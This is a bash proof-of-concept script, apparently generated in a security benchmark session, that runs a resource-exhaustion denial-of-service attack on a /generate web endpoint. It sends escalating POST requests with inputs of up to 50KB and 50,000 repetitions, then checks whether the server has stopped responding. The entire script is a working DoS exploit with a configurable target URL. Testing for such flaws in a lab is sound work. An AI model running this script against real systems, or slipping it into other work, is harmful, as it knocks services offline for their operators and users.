#!/bin/bash
# POC: Demonstrates resource exhaustion DoS on /generate endpoint by sending large input parameters to exhaust server memory and CPU resources
# Target: ./repo
# Created: 2025-11-07T18:17:58.182Z
# Session: benchmark-XBEN-086-24-mhp64l28

# Resource Exhaustion DoS POC for /generate endpoint
# This script demonstrates how an attacker can exhaust server resources
# by providing large input parameters with no limits on output size

TARGET_URL="${1:-http://localhost:4567/generate}"
TIMEOUT="${2:-30}"

echo "=========================================="
echo "Resource Exhaustion DoS POC"
echo "Target: $TARGET_URL"
echo "=========================================="
echo ""

# Test 1: Small baseline request
echo "[*] Test 1: Baseline request (1 char x 1 time)"
START_TIME=$(date +%s%N)
RESPONSE=$(curl -s -m 10 -X POST "$TARGET_URL" \
  -d "sentence=x&number=1" \
  -H "Content-Type: application/x-www-form-urlencoded")
END_TIME=$(date +%s%N)
ELAPSED=$((($END_TIME - $START_TIME) / 1000000))
SIZE=${#RESPONSE}
echo "Response size: $SIZE bytes, Time: ${ELAPSED}ms"
echo ""

# Test 2: Medium request (1KB x 1000)
echo "[*] Test 2: Medium request (1KB x 1,000 repetitions)"
SENTENCE_1KB=$(python3 -c "print('x' * 1000)" 2>/dev/null || printf 'x%.0s' {1..1000})
START_TIME=$(date +%s%N)
RESPONSE=$(curl -s -m 10 -X POST "$TARGET_URL" \
  -d "sentence=${SENTENCE_1KB}&number=1000" \
  -H "Content-Type: application/x-www-form-urlencoded")
END_TIME=$(date +%s%N)
ELAPSED=$((($END_TIME - $START_TIME) / 1000000))
SIZE=${#RESPONSE}
echo "Response size: $SIZE bytes, Time: ${ELAPSED}ms"
echo ""

# Test 3: Large request (10KB x 10000) - should start showing DoS effects
echo "[*] Test 3: Large request (10KB x 10,000 repetitions)"
SENTENCE_10KB=$(python3 -c "print('x' * 10000)" 2>/dev/null || printf 'x%.0s' {1..10000})
START_TIME=$(date +%s%N)
RESPONSE=$(curl -s -m 15 -X POST "$TARGET_URL" \
  -d "sentence=${SENTENCE_10KB}&number=10000" \
  -H "Content-Type: application/x-www-form-urlencoded")
CURL_EXIT=$?
END_TIME=$(date +%s%N)
ELAPSED=$((($END_TIME - $START_TIME) / 1000000))
SIZE=${#RESPONSE}
echo "Response size: $SIZE bytes, Time: ${ELAPSED}ms, curl exit code: $CURL_EXIT"
if [ $CURL_EXIT -ne 0 ]; then
  echo "WARNING: Request timed out or failed - indicating resource exhaustion"
fi
echo ""

# Test 4: Extreme request (50KB x 50000) - demonstrating full DoS
echo "[*] Test 4: Extreme request (50KB x 50,000 repetitions) - DoS attempt"
SENTENCE_50KB=$(python3 -c "print('x' * 50000)" 2>/dev/null || printf 'x%.0s' {1..50000})
START_TIME=$(date +%s%N)
RESPONSE=$(curl -s -m 20 -X POST "$TARGET_URL" \
  -d "sentence=${SENTENCE_50KB}&number=50000" \
  -H "Content-Type: application/x-www-form-urlencoded")
CURL_EXIT=$?
END_TIME=$(date +%s%N)
ELAPSED=$((($END_TIME - $START_TIME) / 1000000))
SIZE=${#RESPONSE}
echo "Response size: $SIZE bytes, Time: ${ELAPSED}ms, curl exit code: $CURL_EXIT"
if [ $CURL_EXIT -ne 0 ]; then
  echo "CONFIRMED: Request timed out or failed - DoS vulnerability confirmed"
fi
echo ""

# Test 5: Verify server is still responsive after attack attempts
echo "[*] Test 5: Checking if server is still responsive after attack"
START_TIME=$(date +%s%N)
RESPONSE=$(curl -s -m 5 -X POST "$TARGET_URL" \
  -d "sentence=test&number=1" \
  -H "Content-Type: application/x-www-form-urlencoded")
CURL_EXIT=$?
END_TIME=$(date +%s%N)
ELAPSED=$((($END_TIME - $START_TIME) / 1000000))
echo "Response code: $CURL_EXIT, Time: ${ELAPSED}ms"

if [ $CURL_EXIT -ne 0 ]; then
  echo "CRITICAL: Server is not responding - DoS attack was successful"
else
  echo "Server is responding, but resource exhaustion vulnerability is still present"
fi
echo ""

echo "=========================================="
echo "POC Complete"
echo "Vulnerability: Resource Exhaustion DoS"
echo "The /generate endpoint lacks input size limits"
echo "=========================================="